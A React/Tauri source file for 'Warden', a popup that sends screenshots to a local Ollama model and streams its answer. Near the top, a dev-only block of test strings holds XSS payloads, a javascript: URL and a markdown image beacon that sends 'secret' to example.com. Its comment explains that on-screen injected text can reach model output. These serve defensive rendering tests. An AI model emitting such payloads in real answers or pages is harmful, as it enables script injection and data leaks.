import { useCallback, useEffect, useRef, useState } from "react";
import { invoke, Channel } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { Answer } from "./Answer";
import "./App.css";

// PLAN.md section 2 wants this in a config file — capture/prompt.txt already does
// that for the CLI. E1 owns making it tunable without a rebuild.
const PROMPT =
  "What am I looking at? If there's an error or something broken, explain it and the fix. Otherwise explain what matters here.";

/**
 * Dev-only. Every one of these could appear in a model answer, because the model
 * transcribes whatever is on screen — including text engineered to be there.
 * All of them must render as inert text or nothing, and none may cause a network
 * request. The image case is the subtle one: it needs no scripting to leak data,
 * only to be rendered.
 */
const INJECTION_CASES = [
  "---",
  "### Injection cases — all of these must be inert",
  "",
  "1. Script tag: <script>alert('xss')</script>",
  "2. Image handler: <img src=x onerror=\"alert('xss')\">",
  "3. Markdown image beacon: ![leak](https://example.com/beacon.png?d=secret)",
  "4. Markdown link: [click me](https://example.com/phish)",
  "5. Javascript URL: [go](javascript:alert('xss'))",
  "6. Raw iframe: <iframe src=\"https://example.com\"></iframe>",
].join("\n");

type StreamEvent =
  | { event: "captured"; data: { width: number; height: number; pngBytes: number } }
  | { event: "startingOllama" }
  | { event: "warming" }
  | { event: "token"; data: { text: string } }
  | {
      event: "done";
      data: { promptEvalCount: number; evalCount: number; totalMs: number; ttftMs: number };
    };

function App() {
  const [answer, setAnswer] = useState("");
  const [status, setStatus] = useState("");
  const [stats, setStats] = useState("");
  const [error, setError] = useState("");
  const [hotkey, setHotkey] = useState<string | null>(null);
  const [probe, setProbe] = useState("");

  const busy = useRef(false);
  const popupRef = useRef<HTMLElement>(null);
  const scrollRef = useRef<HTMLDivElement>(null);
  const contentRef = useRef<HTMLDivElement>(null);

  // Whether the answer is taller than the space it has, and whether the scroll
  // keys actually bound. The hint is only offered when both are true — there is
  // nothing worse than a shortcut printed on screen that does nothing.
  const [overflowing, setOverflowing] = useState(false);
  const [scrollKeys, setScrollKeys] = useState(false);

  // Where the keyboard scroll is heading. `null` means it has arrived and the
  // animation frame loop has stopped.
  const scrollGoal = useRef<number | null>(null);
  const scrollFrame = useRef(0);

  // Which block of the answer the copy shortcut would take, or `null` when not
  // picking. Held in a ref because the event listeners are registered once and
  // must read the current value, not the one captured at registration; `pickTick`
  // exists only to make React re-render the highlight when it moves.
  const pickRef = useRef<number | null>(null);
  const [pickTick, setPickTick] = useState(0);
  const [copied, setCopied] = useState(false);

  // The follow-up box. Open means the popup is holding the caret — the one time
  // it ever does — so it must always be closed again, including on error.
  const [asking, setAsking] = useState(false);
  const askingRef = useRef(false);
  const [draft, setDraft] = useState("");
  const askBoxRef = useRef<HTMLInputElement>(null);

  const setPick = useCallback((index: number | null) => {
    pickRef.current = index;
    setPickTick((t) => t + 1);
  }, []);

  // The copyable units of an answer: its top-level blocks — a paragraph, a code
  // block, a list, a table. Copying the whole response is rarely what anyone
  // wants, and arbitrary text selection needs a pointer the popup doesn't
  // receive, so a block is the unit that works from the keyboard.
  const blocks = useCallback((): HTMLElement[] => {
    const root = contentRef.current;
    if (!root) return [];
    return Array.from(root.querySelectorAll<HTMLElement>(".answer > *")).filter(
      (el) => (el.textContent ?? "").trim().length > 0
    );
  }, []);

  // Dev-only: `?preview` renders a real saved answer plus the injection cases,
  // in a plain browser with no Warden process. Smart App Control blocks the
  // built binary, and this work doesn't need it.
  useEffect(() => {
    if (!import.meta.env.DEV) return;
    if (!new URLSearchParams(location.search).has("preview")) return;
    import("./sample-answer").then(({ SAMPLE }) => {
      // Two separate documents, never one concatenated string. The saved answer
      // was truncated at the token cap mid-fence, and that unclosed fence
      // swallowed the entire injection block - so the cases rendered as code and
      // the test silently passed by never running. Separate instances cannot.
      setAnswer(SAMPLE);
      setProbe(INJECTION_CASES);
      setStats(`preview · ${SAMPLE.length.toLocaleString()} chars`);
    });
  }, []);
  // Follow the bottom while streaming, but stop the moment the reader scrolls
  // up to re-read something — and resume on the next answer.
  const pinned = useRef(true);

  // Both questions stream the same way; only the command differs. Kept in one
  // place so the two can't drift apart in how they report progress.
  const stream = useCallback((): Channel<StreamEvent> => {
    const onEvent = new Channel<StreamEvent>();
    onEvent.onmessage = (message) => {
      if (message.event === "captured") {
        setStatus("Reading your screen…");
      } else if (message.event === "startingOllama") {
        // The longest of the three waits, and the one most likely to look
        // broken: nothing was running, so this press pays for the server too.
        setStatus("Starting Ollama…");
      } else if (message.event === "warming") {
        // Naming the wait is the difference between "slow" and "broken".
        setStatus("Warming the model…");
      } else if (message.event === "token") {
        setStatus("");
        // Functional update: several tokens can land in one React tick.
        setAnswer((prev) => prev + message.data.text);
      } else {
        const d = message.data;
        setStats(
          `${d.promptEvalCount} in · ${d.evalCount} out · ${(d.ttftMs / 1000).toFixed(2)}s to first · ${(d.totalMs / 1000).toFixed(1)}s total`
        );
      }
    };
    return onEvent;
  }, []);

  /// Ask again about the screenshot already taken. No new capture — by now the
  /// screen has moved on, and the popup is sitting over what you asked about.
  const followUp = useCallback(
    async (question: string) => {
      if (busy.current || !question.trim()) return;
      busy.current = true;

      setAnswer("");
      setStats("");
      setError("");
      setStatus("Asking again…");
      pinned.current = true;
      setPick(null);
      setCopied(false);

      try {
        await invoke("ask_followup", { prompt: question, model: null, onEvent: stream() });
      } catch (e) {
        setError(String(e));
        setStatus("");
      } finally {
        busy.current = false;
      }
    },
    [stream, setPick]
  );

  // Closing always goes through here: the caret has to go back to whatever had
  // it before, and leaving the window activatable would mean the next summon
  // steals focus from whatever you were typing in.
  const closeAsk = useCallback(() => {
    askingRef.current = false;
    setAsking(false);
    setDraft("");
    invoke("end_followup").catch(() => {});
  }, []);

  const ask = useCallback(async () => {
    if (busy.current) return;
    busy.current = true;

    setAnswer("");
    setStats("");
    setError("");
    setStatus("Capturing…");
    pinned.current = true;
    // A pick refers to a block of the old answer, which is about to be replaced.
    setPick(null);
    setCopied(false);

    // One handler, not two. This copy predated `stream()` and had already
    // drifted — it never learned about the Ollama-starting event, which is
    // exactly the drift that pulling it into one place was meant to prevent.
    const onEvent = stream();

    try {
      await invoke("ask_about_screen", { prompt: PROMPT, model: null, onEvent });
    } catch (e) {
      setError(String(e));
      setStatus("");
    } finally {
      busy.current = false;
    }
  }, []);

  useEffect(() => {
    const unlisten = listen<boolean>("warden://summoned", (event) => {
      setScrollKeys(event.payload);
      void ask();
    });
    return () => void unlisten.then((f) => f());
  }, [ask]);

  // Move the answer by `direction` notches of Ctrl+Alt+wheel. The popup is
  // click-through and receives no mouse input of its own, so these arrive from a
  // low-level hook in the backend rather than from a wheel event on the page.
  //
  // Eased rather than jumped, for the same reason the window itself is: a real
  // wheel arrives as a burst of notches, and a step per notch would be a stack
  // of jolts. The goal accumulates and a single frame loop chases it, so one
  // notch is a glide and a fast roll is a continuous run.
  const nudge = useCallback((direction: number) => {
    const el = scrollRef.current;
    if (!el) return;

    const STEP = 96; // px per notch — about five lines of the answer
    const limit = Math.max(0, el.scrollHeight - el.clientHeight);
    // Accumulate onto the goal, not onto where the easing has reached, so a
    // second press adds to the first instead of restarting from behind it.
    const from = scrollGoal.current ?? el.scrollTop;
    scrollGoal.current = Math.min(limit, Math.max(0, from + direction * STEP));

    if (scrollFrame.current) return; // a loop is already chasing the goal

    let prev = performance.now();
    const step = (now: number) => {
      const box = scrollRef.current;
      const goal = scrollGoal.current;
      if (!box || goal === null) {
        scrollFrame.current = 0;
        return;
      }

      // Same ease as the window's motion: a fraction of the remaining distance
      // per unit of *measured* time, so a dropped frame travels further rather
      // than stuttering.
      // Never zero or negative: a frame's rAF timestamp is the moment the frame
      // *started*, which can predate the `performance.now()` taken when this
      // loop was scheduled. Left unclamped that makes `k` negative, and the
      // first step travels backwards.
      const dt = Math.max(1, now - prev);
      prev = now;
      const k = 1 - Math.exp(-dt / 55);

      const before = box.scrollTop;
      const remaining = goal - before;

      // `scrollTop` is quantized to whole pixels in WebView2 — measured: writing
      // 92.48 stores 92 and reports no movement at all. An exponential ease
      // therefore stalls about a pixel short of every goal, and a loop that only
      // stops on arrival never stops: it spins at frame rate for the life of the
      // popup and drags the view back whenever anything else scrolls it. So
      // travel at least one whole pixel while there is at least one left.
      const delta = Math.abs(remaining * k) < 1 ? Math.sign(remaining) : remaining * k;
      box.scrollTop = before + delta;

      // Arrived — within a pixel is as close as a quantized offset gets — or the
      // box refused to move, which is how the ends announce themselves: `goal`
      // is derived from `scrollHeight - clientHeight`, both rounded, so it can
      // sit a couple of pixels past where the element can actually scroll.
      if (Math.abs(goal - box.scrollTop) < 1 || box.scrollTop === before) {
        scrollGoal.current = null;
        scrollFrame.current = 0;
        return;
      }
      scrollFrame.current = requestAnimationFrame(step);
    };
    scrollFrame.current = requestAnimationFrame(step);
  }, []);

  // While picking a block, Ctrl+Alt+wheel moves the pick rather than the
  // viewport. It already means up and down, so nothing new has to be learned and
  // nothing further has to be claimed from the rest of the system.
  useEffect(() => {
    const unlisten = listen<number>("warden://scroll", (event) => {
      const at = pickRef.current;
      if (at === null) {
        nudge(event.payload);
        return;
      }
      const list = blocks();
      if (list.length === 0) return;
      setPick(Math.min(list.length - 1, Math.max(0, at + event.payload)));
    });
    return () => {
      void unlisten.then((f) => f());
      if (scrollFrame.current) cancelAnimationFrame(scrollFrame.current);
    };
  }, [nudge, blocks, setPick]);

  // One key, two halves: enter the pick, then take it.
  useEffect(() => {
    const unlisten = listen("warden://followup", () => {
      // A toggle, like Ctrl+Alt+W and Ctrl+Alt+Z. Escape turned out not to reach
      // the page even while the box holds the caret, so the key that opens the
      // box has to be able to close it — otherwise the only way out is to send a
      // question you did not want to ask.
      if (askingRef.current) {
        closeAsk();
        return;
      }
      // Take the caret first, then show the box — focusing an input in a window
      // that cannot be activated does nothing at all.
      invoke("begin_followup")
        .then(() => {
          askingRef.current = true;
          setAsking(true);
          // After paint, or the input isn't there to focus yet.
          requestAnimationFrame(() => askBoxRef.current?.focus());
        })
        .catch((e) => setError(String(e)));
    });
    return () => void unlisten.then((f) => f());
  }, []);

  // Escape, from wherever it lands. Tried at the input first; this is the net.
  useEffect(() => {
    if (!asking) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        e.preventDefault();
        closeAsk();
      }
    };
    window.addEventListener("keydown", onKey, true);
    return () => window.removeEventListener("keydown", onKey, true);
  }, [asking, closeAsk]);

  useEffect(() => {
    const unlisten = listen("warden://copy", () => {
      const list = blocks();
      if (list.length === 0) return;

      if (pickRef.current === null) {
        // Start from the first block actually on screen rather than the top of
        // the answer — the reader has already scrolled to what they care about.
        const box = scrollRef.current;
        const edge = box ? box.getBoundingClientRect().top : 0;
        const visible = list.findIndex((el) => el.getBoundingClientRect().bottom > edge + 4);
        setPick(visible < 0 ? 0 : visible);
        return;
      }

      const chosen = list[pickRef.current];
      setPick(null);
      if (!chosen) return;

      // `innerText`, not `textContent`: it respects rendered line breaks, so a
      // copied code block pastes as the lines you were looking at rather than
      // as one run-together string.
      const text = (chosen.innerText ?? chosen.textContent ?? "").trim();
      if (!text) return;

      invoke("copy_text", { text })
        .then(() => {
          setCopied(true);
          window.setTimeout(() => setCopied(false), 1400);
        })
        .catch(() => {});
    });
    return () => void unlisten.then((f) => f());
  }, [blocks, setPick]);

  // Mark the picked block. Re-applied after every render: the answer re-renders
  // as tokens land, which would throw away a class set once on the element.
  useEffect(() => {
    const list = blocks();
    for (const el of list) el.classList.remove("copy-pick");

    const at = pickRef.current;
    const chosen = at === null ? null : list[at];
    if (!chosen) return;

    chosen.classList.add("copy-pick");
    chosen.scrollIntoView({ block: "nearest" });
  }, [pickTick, answer, probe, blocks]);

  useEffect(() => {
    invoke<string | null>("hotkey_label").then(setHotkey).catch(() => setHotkey(null));
  }, []);

  // Keep the newest text in view, unless the reader has deliberately scrolled up.
  // `instant`, not `smooth` — smooth scrolling fights rapid successive appends.
  useEffect(() => {
    const el = scrollRef.current;
    if (el && pinned.current) {
      el.scrollTo({ top: el.scrollHeight, behavior: "instant" });
    }
  }, [answer]);

  // Tell the window how tall the content is. The window eases to whatever it is
  // told, so this only has to be accurate — not smooth, and not throttled to
  // protect the compositor.
  //
  // Coalesced to one message per animation frame: several tokens land in one
  // React tick, and this used to cost an IPC round trip per commit. Driven by a
  // ResizeObserver rather than by the answer text, so a reflow that arrives
  // late — a code block's scrollbar, a web font finishing — is measured too,
  // instead of leaving the window a few pixels wrong until the next token.
  const hasContent = Boolean(answer || probe);
  useEffect(() => {
    let frame = 0;
    let sent = -1;

    const measure = () => {
      frame = 0;
      const popup = popupRef.current;
      const scroll = scrollRef.current;
      const content = contentRef.current;
      if (!popup) return;

      // `offsetHeight` is the border box, and `.popup` is `height: 100vh` on an
      // undecorated window — so it *is* the window's height in CSS px. Take the
      // scroll viewport out of it and what's left is the chrome: padding, gaps,
      // header, and whichever of the status and stats lines exist right now.
      // Measured rather than assumed — the constant this replaces was wrong by
      // the height of the stats line for the whole of every answer.
      //
      // Nothing scrolling yet (idle, capturing, error) means there is no natural
      // height to ask for, and the window's own minimum is the right answer.
      const target =
        scroll && content
          ? Math.ceil(popup.offsetHeight - scroll.clientHeight + content.scrollHeight)
          : 0;

      // Whether the answer actually overflows, read from the DOM rather than
      // compared against the window's height cap — that cap lives in Rust, and
      // a copy of it here would drift. Set before the early return below, so it
      // still updates on the resizes that don't change the requested height.
      setOverflowing(!!scroll && !!content && content.scrollHeight - scroll.clientHeight > 1);

      // The window eases to its new height *after* the tokens land, so the last
      // auto-scroll aimed at a viewport that then changed under it — leaving the
      // reader a little short of the end once everything settled. This observer
      // fires on every frame of that resize, so re-pinning here tracks the
      // bottom the whole way down. Stops the moment `onScroll` sees the reader
      // move away from the end.
      if (scroll && pinned.current) scroll.scrollTop = scroll.scrollHeight;

      if (target === sent) return;
      sent = target;
      invoke("fit_window", { contentHeight: target }).catch(() => {});
    };

    const request = () => {
      if (!frame) frame = requestAnimationFrame(measure);
    };

    // The content for its height, and the viewport because the chrome above it
    // changes size independently. Watching the viewport also fires on every
    // frame of the window's own animation, which is harmless: chrome plus
    // content doesn't depend on the window's height, so the target comes back
    // identical and nothing is sent.
    const observer = new ResizeObserver(request);
    if (contentRef.current) observer.observe(contentRef.current);
    if (scrollRef.current) observer.observe(scrollRef.current);
    request();

    return () => {
      observer.disconnect();
      if (frame) cancelAnimationFrame(frame);
    };
  }, [hasContent]);

  function onScroll() {
    const el = scrollRef.current;
    if (!el) return;
    const distanceFromBottom = el.scrollHeight - el.scrollTop - el.clientHeight;
    pinned.current = distanceFromBottom < 50;
  }

  return (
    <main className="popup" ref={popupRef}>
      <header>
        <span className="mark">Warden</span>
        {/* The hint says whatever is most useful *now*: confirmation of a copy,
            then how to finish a pick, then how to reach the rest of a long
            answer — and only otherwise the key you just pressed to get here.
            `pickRef` is safe to read during render because `pickTick` is what
            triggered it. */}
        {copied ? (
          <span className="hint ok">copied</span>
        ) : pickRef.current !== null ? (
          <span className="hint ok">Ctrl+Alt+wheel to pick · Z to copy</span>
        ) : scrollKeys && overflowing ? (
          <span className="hint">Ctrl+Alt+wheel scrolls · Z copies</span>
        ) : scrollKeys && answer ? (
          <span className="hint">Ctrl+Alt+Z to copy</span>
        ) : hotkey ? (
          <span className="hint">{hotkey}</span>
        ) : (
          <span className="hint warn">no hotkey bound</span>
        )}
      </header>

      {status && <p className="status">{status}</p>}
      {error && <pre className="error">{error}</pre>}

      {hasContent && (
        <div className="scroll" ref={scrollRef} onScroll={onScroll}>
          {/* Wrapper so the content's own height can be observed — the scroll
              box's height is decided by the window, not by what's in it. */}
          <div className="content" ref={contentRef}>
            {answer && <Answer text={answer} />}
            {probe && <Answer text={probe} />}
          </div>
        </div>
      )}

      {asking && (
        <form
          className="ask"
          onSubmit={(e) => {
            e.preventDefault();
            const question = draft;
            closeAsk();
            void followUp(question);
          }}
        >
          <input
            ref={askBoxRef}
            id="followup"
            value={draft}
            onChange={(e) => setDraft(e.target.value)}
            onKeyDown={(e) => {
              // Esc works here and nowhere else in the app: the window is holding
              // focus for exactly as long as this box is open, so it is the one
              // moment a key event can reach the page at all.
              if (e.key === "Escape") {
                e.preventDefault();
                closeAsk();
              }
            }}
            placeholder="Ask about the same screenshot…"
            autoComplete="off"
            spellCheck={false}
          />
        </form>
      )}

      {stats && <p className="stats">{stats}</p>}

      {!status && !answer && !error && (
        <p className="idle">
          Press {hotkey ?? "your hotkey"} anywhere to ask about your screen.
          <br />
          Press it again to dismiss.
        </p>
      )}
    </main>
  );
}

export default App;
